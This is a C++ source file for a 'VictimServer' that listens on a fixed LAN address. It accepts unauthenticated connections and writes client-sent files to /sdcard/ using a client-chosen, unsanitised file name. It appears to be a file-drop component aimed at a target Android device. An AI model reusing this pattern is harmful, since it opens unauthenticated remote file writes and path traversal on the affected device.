#include <iostream>
#include <fstream>
#include <string>

#include "server.h"

using namespace std;

VictimServer::VictimServer(int port) : m_port(port)
{
		memset(&s_sa, 0, sizeof(s_sa));
		s_sa.sin_family = AF_INET;

		s_sa.sin_port = htons(port);
		s_sa.sin_addr.s_addr = inet_addr("192.168.1.103");

		if((m_s_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
				perror("socket");
				exit(1);
		}

		if(bind(m_s_sock, (struct sockaddr*)&s_sa, sizeof(s_sa)) != 0){
				perror("bind");
				exit(1);
		}
}

void VictimServer::beginToListen()
{
		listen(m_s_sock, 10);
		cout <<  "server !" << endl;
		while(true){
			socklen_t size = sizeof(c_sa);
			if((m_c_sock = accept(m_s_sock, (struct sockaddr*)&c_sa, &size)) < 0){
					perror("accept");
					exit(1);
			}
			cout << "connection from " << inet_ntoa(c_sa.sin_addr) << endl;

			readCommand();
			
			if(command == SEND_FILE_CMD){
					cout << "  Get => [Send_File command]." << endl;
					getRemoteFile(m_c_sock);
					close(m_c_sock);
			}else{
					cout << "command: " << command << endl;
			}
		}


}

void VictimServer::readCommand()
{
	int readNum = 0;

	readNum = read(m_c_sock, &command, sizeof(command));
	if(readNum < 0){
			close(m_c_sock);
	}
}
void VictimServer::getRemoteFile(int client_fd)
{
	int readNum = 0;
	char fileName[FILE_NAME_MAX];

	//read in file name
	readNum = read(client_fd, fileName, sizeof(fileName));
	if(readNum < 0){
			perror("read file name");
			return;
	}

	string fullFilePath("/sdcard/");
	string file_name(fileName);
	fullFilePath += file_name;

	cout << "           => [file name]: " << fullFilePath << endl;

	ofstream out(fullFilePath.c_str(), ofstream::binary);
	
	while((readNum = read(client_fd, readBuf, 4096)) > 0){
			out.write(readBuf, readNum);
	}
	out.close();
	cout << "transfer done. " << endl;
}

int main()
{
		VictimServer vs(12345);
		vs.beginToListen();

		return 0;
}

